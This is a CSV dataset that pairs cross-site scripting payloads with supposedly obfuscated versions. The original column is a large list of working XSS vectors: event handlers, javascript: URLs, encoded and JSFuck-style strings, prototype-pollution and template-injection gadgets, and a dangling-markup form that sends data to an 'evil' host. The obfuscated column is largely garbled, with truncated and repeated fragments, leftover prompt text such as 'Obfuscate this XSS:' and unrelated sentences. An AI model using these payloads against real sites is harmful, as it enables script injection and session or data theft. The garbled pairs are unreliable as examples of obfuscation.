original,ofuscado
"<small onkeyup=""alert(1)"" contenteditable>test</small>",": small onkeyup=""alert(1)"" contenteditable>test/small>"
"<label oncopy=""alert(1)"" contenteditable>test</label>","XSS: label oncopy=""alert(1)"" contenteditable>test/label>"
"<object onbeforepaste=""alert(1)"" contenteditable>test</object>",>test/object>
"<noembed onbeforecut=""alert(1)"" contenteditable>test</noembed>",": noembed onbeforecut=""alert(1)"" contenteditable>test/noembed>"
<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>,:1 onbeforeactivate=alert(1)>/samp>.
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationstart=""alert(1)""></menuitem>","/menuitem style=""animation-name:x"" onanimationstart=""alert(1)"">/menuitem>/menuitem>/menuitem>/menuitem>##/menuitem>##=/menuitem>#=/menuitem> XSS: style>@keyframes x=/style>##_%*!"
"<dfn onmouseover=""alert(1)"">test</dfn>","XSS: dfn onmouseover=""alert(1)"">test/dfn>"
<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>,>/th>input autofocus>
<b id=x tabindex=1 onfocusin=alert(1)></b>,Obfuscate this XSS: b id=x tabindex=1 onfocusin=alert(1)>/b>
"<multicol oncopy=""alert(1)"" contenteditable>test</multicol>","to the answer: multicol oncopy=""alert(1)"" contenteditable>test/multicol>"
"<sub onmousedown=""alert(1)"">test</sub>","Obfuscate this XSS: sub onmousedown=""alert(1)"">test/sub>"
<h1 onpointerleave=alert(1)>xss</h1>,s=alert(1)>xss/h1>.
"<hr draggable=""true"" ondragstart=""alert(1)"">test</hr>",": hr draggable=""true"" ondragstart=""alert(1)"">test/hr>"
"<img src=""jav ascript:alert('');"">","XSS::('');"">:""> img src=""jav ascript:alert('');""> img src=""jav ascript:alert('');""> img src=""jav ascript:alert('');""> img src=""jav ascript:alert('');"">"
"<bgsound onkeyup=""alert(1)"" contenteditable>test</bgsound>","bgsound onkeyup=""alert(1)"" contenteditable>test/bgsound>"
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>",": HTML: div draggable=""true"" contenteditable>drag me/div>bdi ondragover=alert(1) contenteditable>drop here/bdi>"
"<figcaption draggable=""true"" ondragleave=""alert(1)"">test</figcaption>",": figcaption draggable=""true"" ondragleave=""alert(1)"">test/figcaption>"
"<main onclick=""alert(1)"">test</main>","-redistribute this XSS: main onclick=""alert(1)"">test/main>"
"<mark onkeyup=""alert(1)"" contenteditable>test</mark>","t/mark> we supprimate this XSS: mark onkeyup=""alert(1)"" contenteditable>test/mark>"
"<figcaption onmouseleave=""alert(1)"">test</figcaption>",":figcaption onmouseleave=""alert(1)"">test/figcaption>"
<svg><element onload=alert(1)></element>,the XSS instead of this XSS: svg>element onload=alert(1)>/element>
"<script/ src=""http://.rocks/.js""></script>",": script/ src=""http://.rocks/.js"">/script>/script> XSS:script>/script>/script>"
"<thead onpaste=""alert(1)"" contenteditable>test</thead>","XSS: thead onpaste=""alert(1)"" contenteditable>test/thead>"
"<legend oncut=""alert(1)"" contenteditable>test</legend>","Obfuscate this XSS: legend oncut=""alert(1)"" contenteditable>test/legend>"
<wbr onpointerout=alert(1)>xss</wbr>,Abstract this XSS: wbr onpointerout=alert(1)>xss/wbr>
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>","=x style=""position:absolute;"" style=""position:absolute;"" onanimationcancel=""alert(1)"">/canvas>/canvas> xfrom left:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>canvas id=x style=""position:absolute;"" style=""position:absolute;"""
"<style>:target {transform: rotate(180deg);}</style><sub id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></sub>",":/style>sub id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/sub>"
<legend onpointerdown=alert(1)>xss</legend>,: legend onpointerdown=alert(1)>xss/legend>
<strike onpointerenter=alert(1)>xss</strike>,strike onpointerenter=alert(1)>xss/strike>
"<tfoot onmouseleave=""alert(1)"">test</tfoot>",": tfoot onmouseleave=""alert(1)"">test/tfoot>"
"<frameset onmouseenter=""alert(1)"">test</frameset>","s: frameset onmouseenter=""alert(1)"">test/frameset>"
<menu onpointerdown=alert(1)>xss</menu>,Obfuscate this XSS: menu onpointerdown=alert(1)>xss/menu>
"<abbr onmouseover=""alert(1)"">test</abbr>",": abbr onmouseover=""alert(1)"">test/abbr>"
"<nextid draggable=""true"" ondragend=""alert(1)"">test</nextid>",>test/nextid>
<td onpointerleave=alert(1)>xss</td>,=alert(1)>xss/td>>xss/td>.
<a onpointermove=alert(1)>xss</a>,a onpointermove=alert(1)>xss/a> XSS: a onpointermove=alert(1)>xss/a>
"<nav draggable=""true"" ondragleave=""alert(1)"">test</nav>",": nav draggable=""true"" ondragleave=""alert(1)"">test/nav>"
<input type=radio id=x onfocus=alert(1)>,: id=x onfocus=alert(1)>
<html onpointermove=alert(1)>xss</html>,: html onpointermove=alert(1)>xss/html>
<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>,: map id=x tabindex=1 ondeactivate=alert(1)>/map>input id=y autofocus>
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationstart=""alert(1)""></cite>","XSS: style>@keyframes x/style>cite style=""animation-name:x"" onanimationstart=""alert(1)"">/cite>/cite>/cite>/cite>/cite>/cite style=""animation-name:x"" onanimationstart=""alert(1)"">/cite>/cite>/cite>/cite>/cite>/cite>/cite>/cite>"
"<span onmouseout=""alert(1)"">test</span>",": span onmouseout=""alert(1)"">test/span>"
"<div draggable=""true"" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>",/div>applet ondrop=alert(1) contenteditable>drop here/applet>
<big onpointerup=alert(1)>xss</big>,Obfuscate this XSS: big onpointerup=alert(1)>xss/big>
"<menu draggable=""true"" ondragstart=""alert(1)"">test</menu>",>test/menu>
"<span onbeforecut=""alert(1)"" contenteditable>test</span>","span onbeforecut=""alert(1)"" contenteditable>test/span>"
"<style>:target {color:red;}</style><i id=x style=""transition:color 1s"" ontransitionend=alert(1)></i>","XSS: style>:target color:red;/style>i id=x style=""transition:color 1s"" ontransitionend=alert(1)>/i>"
"<style>:target {transform: rotate(180deg);}</style><acronym id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></acronym>","s:>acronym id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/acronym>/acronym>/acronym>/acronym>"
"<legend onkeypress=""alert(1)"" contenteditable>test</legend>",> test/legend>
"<big onmouseout=""alert(1)"">test</big>","Obfuscate this XSS: big onmouseout=""alert(1)"">test/big>"
<font onpointerdown=alert(1)>xss</font>,Obfuscate this XSS: font onpointerdown=alert(1)>xss/font>
<set onpointermove=alert(1)>xss</set>,the answer: set onpointermove=alert(1)>xss/set>/set>
<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,/tt>input autofocus>
<dl id=x tabindex=1 onfocus=alert(1)></dl>,xSS: dl id=x tabindex=1 onfocus=alert(1)>/dl>
"<object onmouseover=""alert(1)"">test</object>",": object onmouseover=""alert(1)"">test/object>"
"<object onmouseout=""alert(1)"">test</object>",": object onmouseout=""alert(1)"">test/object>"
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>","x style=""transition:color 10s"" ontransitioncancel=alert(1)>/data>"
<hgroup onpointerover=alert(1)>xss</hgroup>,>: hgroup onpointerover=alert(1)>xss/hgroup>
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>","XSS: div draggable=""true"" contenteditable>drag me/div>pre ondrop=alert(1) contenteditable>drop here/pre>"
"<colgroup onclick=""alert(1)"">test</colgroup>","-colgroup onclick=""alert(1)"">test/colgroup>"
<div onpointerdown=alert(1)>xss</div>,Obfuscate this XSS: div onpointerdown=alert(1)>xss/div>
<strike onpointerleave=alert(1)>xss</strike>,> XSS: strike onpointerleave=alert(1)>xss/strike>
"<embed onmousemove=""alert(1)"">test</embed>",>test/embed>
"<style>@keyframes x{}</style><section style=""animation-name:x"" onanimationstart=""alert(1)""></section>","style>@keyframes x/style>section style=""animation-name:x"" onanimationstart=""alert(1)"">/section>/section>."
"<element onmousedown=""alert(1)"">test</element>",": element onmousedown=""alert(1)"">test/element>"
<cite onpointerup=alert(1)>xss</cite>,: cite onpointerup=alert(1)>xss/cite>.
"<nav draggable=""true"" ondrag=""alert(1)"">test</nav>",": nav draggable=""true"" ondrag=""alert(1)"">test/nav>"
"<keygen oncopy=""alert(1)"" contenteditable>test</keygen>","this XSS: keygen oncopy=""alert(1)"" contenteditable>test/keygen>"
<button onpointerenter=alert(1)>xss</button>,>. Obfuscate this XSS: button onpointerenter=alert(1)>xss/button>.
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>","Obfuscate this XSS: s onbeforepaste=""alert(1)"" contenteditable>test"
<svg><em onload=alert(1)></em>,XSS:svg>em onload=alert(1)>/em>
"<small onbeforecopy=""alert(1)"" contenteditable>test</small>","small onbeforecopy=""alert(1)"" contenteditable>test/small>"
"<element draggable=""true"" ondrag=""alert(1)"">test</element>","to deviate this XSS: element draggable=""true"" ondrag=""alert(1)"">test/element>"
"<style>:target {color: red;}</style><ol id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ol>",", but not all.=""color 10s"" ontransitioncancel=alert(1)>/ol>"
"<style onclick=""alert(1)"">test</style>",": style onclick=""alert(1)"">test/style>"
"<video onkeypress=""alert(1)"" contenteditable>test</video>","Obfuscate thisXSS: video onkeypress=""alert(1)"" contenteditable>test/video>"
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,:list=alert(1)>/blockquote>
"<q onkeypress=""alert(1)"" contenteditable>test</q>",""" contenteditable>test/q>"
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,: tt id=x tabindex=1 ondeactivate=alert(1)>/tt>input id=y autofocus>
<embed id=x tabindex=1 onactivate=alert(1)></embed>,the following: embed id=x tabindex=1 onactivate=alert(1)>/embed>
"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>","and: div draggable=""true"" contenteditable>drag me/div>nobr ondragover=alert(1) contenteditable>drop here/nobr>"
<listing id=x tabindex=1 onactivate=alert(1)></listing>,/listing> and/or>> =/listing>
"<article draggable=""true"" ondragend=""alert(1)"">test</article>",": article draggable=""true"" ondragend=""alert(1)"">test/article>"
<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>,"input autofocus>,span onfocusout=alert(1) tabindex=1 tabindex=1 id=x>/span>input autofocus>."
"<strong onmousedown=""alert(1)"">test</strong>",>test/strong>
"<dt onbeforecut=""alert(1)"" contenteditable>test</dt>","Obfuscate this XSS: dt onbeforecut=""alert(1)"" contenteditable>test/dt>"
"<style>:target {transform: rotate(180deg);}</style><nav id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nav>","XSS: style>:target transform: rotate(180deg);/style>nav id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/nav>"
<svg><thead onload=alert(1)></thead>,this XSS: svg>thead onload=alert(1)>/thead>
"<tbody onmouseenter=""alert(1)"">test</tbody>","tbody onmouseenter=""alert(1)"">test/tbody>"
"<img src=""`<javascript:alert>`('')""","XSS: img src=""javascript:alert>('')"" Obfuscate this XSS: img src=""javascript:alert>('')"""
"<source ondblclick=""alert(1)"">test</source>",": source ondblclick=""alert(1)"">test/source>"
"<command onmousedown=""alert(1)"">test</command>",": command onmousedown=""alert(1)"">test/command>"
"<li onmouseleave=""alert(1)"">test</li>",/li>>test/li>
<wbr onpointermove=alert(1)>xss</wbr>,Obfuscate this XSS: wbr onpointermove=alert(1)>xss/wbr>
"<br onmouseout=""alert(1)"">test</br>",": br onmouseout=""alert(1)"">test/br>"
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>","color: red;/style>body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)>/body>"
"<link draggable=""true"" ondragleave=""alert(1)"">test</link>","XSS: link draggable=""true"" ondragleave=""alert(1)"">test/link>"
"<template oncut=""alert(1)"" contenteditable>test</template>","to this XSS: template oncut=""alert(1)"" contenteditable>test/template>"
<iframe onpointermove=alert(1)>xss</iframe>,: iframe onpointermove=alert(1)>xss/iframe>
"<label onmouseover=""alert(1)"">test</label>",", label onmouseover=""alert(1)"">test/label>"
"<pre oncopy=""alert(1)"" contenteditable>test</pre>","Obfuscate thisXSS: pre oncopy=""alert(1)"" contenteditable>test/pre>"
"<head onmouseout=""alert(1)"">test</head>",": head onmouseout=""alert(1)"">test/head>"
<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>,", nobr id=x tabindex=1 onfocusin=alert(1)>/nobr>"
<audio controls onwaiting=alert(1)><source src=x type=x></audio>,audio controls onwaiting=alert(1)>source src=x type=x>/audio>
<xss contenteditable onbeforeinput=alert(1)>test,ss contenteditable onbeforeinput=alert(1)>test: xss contenteditable onbeforeinput=alert(1)>test: xss contenteditable onbeforeinput=alert(1)>test.
"<script>object.prototype.src = ['data:,alert(1)//']</script><script>$.getscript('https://google.com/')</script>","rc = ['data:,alert(1)//']/script>script>$.getscript('http://google.com/']/script>script>$.getscript('http://google.com/'/script>script>$.getscript('http://google.com/'"
"';parent['\x65\x76\x61\x6c']('parent[""\x61\x6c\x65\x72\x74""](parent[""\x61\x74\x6f\x62""](""wfnt""))');//","[""x65x76x61x6c']('wfnt""))');//// ';parent['x65x76x61x6c']('parent['x65x76x61x6cx65x72x74""]('wfnt""))');/// (parent[""x61x74x6fx62"""
';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,';window['x61x6cx65x72x74'](window['x64x6fx63x75x6dx65x6ex74'][''x64x6fx63x75x6dx65x6ex74'](window['x64x6fx63x75x6d
';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,XSS: ';frames[(++[])[+!![]][+!![]]+(!![]+[])[+!![]])[+!![]][+!![]]]((++[]])[+!![]]);//////////////////////////////////////
"<a href=""javascript&colon;alert(1)"">xss</a> <a href=""java&tab;script:alert(1)"">xss</a> <a href=""java&newline;script:alert(1)"">xss</a> <a href=""javascript&colon;alert&lpar;1&rpar;"">xss</a>","a href=""javascript&colon;alert(1)"">xss/a> a href=""java&tab;script:alert(1)"">xss/a> a href=""java&tab;script:alert(1)"">xss/a> a href=""java&tab;script:alert(1)"">xss/a> a "
<xss onbeforepaste=alert(1)>xss</xss>,: xss onbeforepaste=alert(1)>xss/xss> Obfuscate this XSS: xss onbeforepaste=alert(1)>xss/xss>
';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,x64x6fx63x75x6dx65x6ex74']['x64x6fx63x75x6dx65x6ex74']['x64x6fx6dx61x69x6e']);///frames['x61x6cx65x72x74'](frame
<script>location=name</script>,Obfuscate this XSS: script>location=name/script>
{{$emit.constructor`alert(1)`()}},().
"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",": embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="""
"<xss onkeydown=""alert(1)"" contenteditable style=display:block>test</xss>","Obfuscate this.S: xss onkeydown=""alert(1)"" contenteditable style=display:block>test/xss>"
<form action=javascript:alert(1)><input type=submit value=xss>,searchInput type=submit value=xss>
"<script>throw onerror=eval,{linenumber:1,columnnumber:1,filename:1,message:name}</script>",":1,filename:1,message:name/script>."
"<script>object.prototype.whitelist = {img: ['onerror', 'src']}</script><script>document.write(filterxss('<img src onerror=alert(1)>'))</script>",": ['onerror', 'src']/script>script>document.write(filterxss('img src onerror=alert(1)>'))/script>script>document.write(filterxss('img src onerror=alert(1)>'))/script>script>document.write(filterxss('img src onerror=a"
"<a href=""&#x6a;avascript:alert(1)"">xss</a>","ascript:alert(1)"">xss/a>!"
"<a href=""javascript&colon;alert(1)"">firefox</a>","/a> a href=""javascript&colon;alert(1)"">firefox/a>"
';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//,Obliquez XSS: ';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//////////////
<input ng-cut=$event.composedpath()|orderby:'(y=alert)(1)'>,o.alert)(1)'>.::'(y=alert)(1)'>.
"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""xss via formtarget in input type submit""></form>",".ml>input type=hidden name=x value=""';eval(name)//"">input type=hidden name=context value=js_string_single>input type=""submit"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" value=""xss via formtarget in input type submit""> /form>/form>/form>"
"<a href=""j&#x61vascript:alert(1)"">xss</a> <a href=""&#x6a avascript:alert(1)"">xss</a> <a href=""&#x6a avascript:alert(1)"">xss</a>","a href=""j&#x61vascript:alert(1)"">xss/a> a href=""&#x6a avascript:alert(1)"">xss/a> a href=""&#x6a avascript:alert(1)"">xss/a> a href=""&#x6a avascript:alert(1)"">"
"<script>window.name='javascript:alert(1)';function blah(){} blah(""""+new class b{tostring=e=>location=name}+"""")</script>","text>window.name='javascript:alert(1)';function blah() blah(""""+new class btostring=e=>location=name+"""")/script>window.name='javascript:alert(1)';function blah() blah(""""+new class btostring=e=>location=name+"""")/script>window.name='javascript:alert"
"<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src=""data:text/vtt,webvtt file 1 00:00:00.000 --> 00:00:05.000 <b>xss</b> ""></video>","is the XSS: video controls>source src=validvideo.mp4 type=video/mp4>track default oncuechange=alert(1) src=""data:text/vtt,webvtt file 1 00:00:00.000 --> 00:00:05.000 b>xss/b> "">/video>/video>/video>/video>/video>/video"
"<a href=# language=""jscript.encode"" onclick=""#@~^caaaaa==c^+.d`8#mgiaaa==^#~@"">xss</a> <a href=# onclick=""jscript.encode:#@~^caaaaa==c^+.d`8#mgiaaa==^#~@"">xss</a>","/a> a href=# language=""jscript.encode"" onclick=""#@caaaaa==c+.d8#mgiaaa==#@"">xss/a> a href=# language=""jscript.encode"" onclick=""#@caaaa===c+.d8#mgiaaaa==#"
<xss onmousewheel=alert(1) style=display:block>requires scrolling,Obfuscate this XSS: xss onmousewheel=alert(1) style=display:block>requires scrolling scrolling
"<embed src=""#! alert(1)"" codebase=javascript:>",":> embed src=""#! alert(1)"" codebase=javascript:>"
"<script>object.prototype.url = ['data:,alert(1)//'];object.prototype.datatype = 'script';</script><script>$.get('https://google.com/');$.post('https://google.com/');</script>","XSS: script>object.prototype.url = ['data:,alert(1)//'];object.prototype.datatype = 'script';/script>script>$.get('https://google.com/');$.post('https://google.com/');/script>$.get('https://google.com/');$.post('https://go"
<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,Obfuscate this XSS: audio controls onsuspend=alert(1)>source src=validaudio.mp3 type=audio/mpeg>/audio>
<script>window.name='javascript:alert(1)';</script><svg onload=location=name>,? .. ../script>svg onload=location=name> ...
{y:''.constructor.prototype}.y.charat=[].join;[1]|orderby:'x=alert(1)',] (x=alert(1)').Obfuscate this XSS: y:''.constructor.prototype.y.charat=[].join;[1]|orderby:'x=alert(1)''.constructor.prototype.y.charat=[].join;[1]|orderby:'x=alert(1)''
"<img/src/onerror=""window.onload=settimeout;event.prototype.tostring=domexception.prototype.tostring;event.prototype.name='alert\x281\x29'"">","=alertx281x29'"">"
<x #[_c.constructor`alert(1)`()]>,: x #[_c.constructoralert(1)()]>
"<object data=""#! alert(1)"" codebase=javascript:>",": object data=""#! alert(1)"" codebase=javascript:>"
"<input type=""hidden"" accesskey=""x"" onclick=""alert(1)""> (press alt+shift+x on windows) (ctrl+alt+x on os x)",(press alt+shift+x on windows) (ctrl+alt+x on os x) (ctrl+alt+x on os x) (ctrl+alt+x on os x) (ctrl+alt+x on os x) (ctrl+alt+x on os x) (ctrl+alt+x on os x) (ctrl+
"<script>object.prototype.tagname = 'img'object.prototype.src = ['x:x']object.prototype.onerror = ['alert(1)']</script><script>(function() {var view = mn.view.extend({template: '#template-layout'});var app = mn.application.extend({region: '#app', onstart: function() {this.showview(new view());}});var app = new app();app.start();})();</script><div id=""template-layout"" type=""x-template/underscore"">xxx</div>",XSS script>object.prototype.tagname = 'img'object.prototype.src = ['x:x']object.prototype.onerror = ['alert(1)']/script>script>(function() var view = mn.view.extend(template: '#template-layout');var app = new app();app.start();)();/
"tostring().constructor.prototype.charat=[].join; [1,2]|orderby:tostring().constructor.fromcharcode(120,61,97,108,101,114,116,40,49,41)","(12,61,97,108,101,114,116,40,49,41): tostring().constructor.prototype.charat=[].join; [1,2]|orderby:tostring().constructor.fromcharCode(120,61,97,108,101,114,116,40,49,41)"
"<a href=""javascript&#x6a;avascript:alert(1)"">firefox</a>","=fauna >default=fA/fA/html a href=""javascript&#x6a;avascript:alert(1)"">firefox/a>"
<div ongestureend=alert(1)>xss</div>,Obfuscate this XSS: div ongestureend=alert(1)>xss/div>
"<form onformdata=""alert(1)""><button>click</button></form>","Obfuscate this XSS: form onformdata=""alert(1)"">button>click/button>/form>"
<script>object.prototype.hif = ['javascript:alert(document.domain)'];</script>,:/script>object.prototype.hif = ['javascript:alert(document.domain)'];/script>object.prototype.hif = ['javascript:alert(document.domain)'];/script>object.prototype.hif = ['javascript:alert(document.domain)'];/script>object.prototype.hif = ['javascript:alert(document.
<script>object.prototype.preventdefault='x';object.prototype.handleobj='x';object.prototype.delegatetarget='<img/src/onerror=alert(1)>';/* no extra code needed for jquery 1 & 2 */$(document).off('foobar');</script>,: /script>object.prototype.preventdefault='x';object.prototype.handleobj='x';object.prototype.delegatetarget='img/src/onerror=alert(1)>';/* no extra code needed for jquery 1 & 2 */$(document).off('foobar');/script>object.prototype.preventdefault='x'
"tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;[""a"",""alert(1)""].sort(tostring.constructor)",".tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;[""a"",""alert(1)""].sort(tostring.constructor)"
"<form><button style=""width:100%;height:100%"" type=submit formaction=""//evil?","Obfuscate this XSS: form>button style=""width:100%;height:100%"" type=submit formaction=""//evil?"
<script>object.prototype.documentmode = 9</script>,mode = 9/script>object.prototype.documentmode = 10/script>
"<script>throw[onerror]=[alert],1</script>","XSS: script>throw[onerror]=[alert],1/script>"
<x @[_b.constructor`alert(1)`()]>,>:: x @[_b.constructoralert(1)()]>
"<xss draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</xss>","XSS: xss draggable=""true"" style=display:block>test/xss>"
';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,this XSS: ';self[(++[])[+!![]]+(![]+[]])[!+[]+!![]])[!+[]+!![])[+!![]]((++[]])((+!![]])((+!![]]]);//
';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,this XSS: ';parent[(++[])[+!![]]+(![]+[])[!+[]+!![]]+(!![]+[])[+!![]]+(![]+[])[+!![]]] ((++!![]])[++[]]]]);//
<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>,> ?==500 height=500 type=text/html> this XSS: embed code=https://portswigger-labs.net width=500 height=500 type=text/html> XSS: embed code=https://portswigger-labs.net width=500 height=500 type=text/html>
<button popovertarget=x>click me</button><xss ontoggle=alert(1) popover id=x>xss</xss>,", xss> popover id=x>xss/xss> onggle=alert(1) popover id=x>xss/xss> xss>"
"<xss onclick=""alert(1)"" style=display:block>test</xss>","Either way, it will be better served than it expected."
"<script>onerror=eval,new name</script>","Obfuscate this XSS: script>onerror=eval,new name/script>"
<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,this XSS: this XSS: video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>
"<meta charset=""utf-7"" /> +adw-script+ad4-alert(1)+adw-/script+ad4-",": meta charset=""utf-7"" /> +adw-script+ad4-alert(1)+adw-/script+ad4-alert(1)+adw-/script+ad4-alert (1)+adw-/script+ad4-alert(1)+adw-/script+ad4-alert(1)+adw-/script+ad4-alert(1)"
';globalthis['\141\154\145\162\164']('\130\123\123');//,Impossibly Obfuscate this XSS: ';globalthis['141154145162164']('130123123');//// iI.a.
<xss onwebkitmouseforcewillbegin=alert(1)>xss</xss>,st: xss onwebkitmouseforcewillbegin=alert(1)>xss/xss>
"<img src=""blah"" style=""-moz-binding: url(data:text/xml;charset=utf-8,%3c%3fxml%20version%3d%221.0%22%3f%3e%3cbindings%20xmlns%3d%22 http%3a//www.mozilla.org/xbl%22%3e%3cbinding%20id%3d%22loader%22%3e%3cimplementation%3e%3cconstructor%3e%3c%21%5bcdata%5bvar%20url%20%3d%20%22alert.js %22%3b%20var%20scr%20%3d%20document.createelement%28%22script%22%29%3b%20scr.setattribute%28%22src%22%2curl%29%3b%20var%20bodyelement%20%3d%20 document.getelementsbytagname%28%22html%22%29.item%280%29%3b%20bodyelement.appendchild%28scr%29%3b%20%5d%5d%3e%3c/constructor%3e%3c/implementation%3e%3c/ binding%3e%3c/bindings%3e)"" />","22%2curl%29%3b%20var%20url%20%3d%20%22alert.js %22%3b%20bodyelement%20%3d%20document.createelement%28%22script%22%29%3d%20scr.setattribut %22%22%2curl%22%3e%3c/binding%3c/binding%3e)"" /> "
"<iframe src=""javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'""></iframe>",&#x57;&#x74;&#x64;&#x77;&#x75;&#x64;&#x66;&#x64;&#x71;&#x64;&#x64;&#x68;&#x64;&#x31;&#x29;&#x28;&#x29;&#x43;&#x74;&#x70;&#x72;&#x64;
"<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",".html name="" iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="" iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="""
"<script><img title=""</script><img src onerror=alert(1)>""></script>","this XSS: script>img title=""/script>img src onerror=alert(1)>"">/script>"
"<xss onkeyup=""alert(1)"" contenteditable style=display:block>test</xss>",":(id= )-(XSS) -(xss onkeyup=""alert(1)"" contenteditable style=display:block>test/xss>"
{{'a'.constructor.prototype.charat=[].join;$eval('x=alert(1)');}},.constructor.prototype.charat=[]join;$eval('x=alert(1)');$eval('x=alert(1)');$eval('x=alert(1)');$eval('x=alert(1)');$eval('x=alert(1)');$eval('x=alert(1)');$eval('x=alert(1)'
<script>'alert\x281\x29'instanceof{[symbol['hasinstance']]:eval}</script>,Obfuscate this XSS:script>'alertx281x29'instanceof[symbol['hasinstance']]:eval/script>'alertx281x29'instanceof[symbol['hasinstance']]]:eval/script>'alertx281x29'instanceof[symbol['hasinstance']
<x @click=$event.view.alert(1)>click</x>,event.view.alert(1)>click/x>
